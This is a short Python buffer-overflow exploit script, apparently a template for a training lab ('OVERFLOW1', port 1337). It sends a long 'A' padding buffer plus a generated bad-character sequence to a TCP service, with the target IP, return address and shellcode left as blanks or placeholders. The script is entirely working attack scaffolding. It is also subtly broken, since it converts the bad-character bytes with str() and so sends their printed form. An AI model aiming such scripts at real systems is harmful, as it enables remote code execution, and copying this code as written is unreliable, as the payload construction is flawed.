
import socket

ip = ""
port = 1337

prefix = "OVERFLOW1 "
offset = 2000
buffer = "A" * offset
retn = ""
padding = ""
shellcode = "XXXX"

bad_char_gen = bytearray(range(0,256))
char_enum = [b"\x00"]
for bad in char_enum:
            bad_char_gen = bad_char_gen.replace(bad,b"")
payload2 = str(bad_char_gen)
payload = prefix + buffer + payload2
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(payload + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
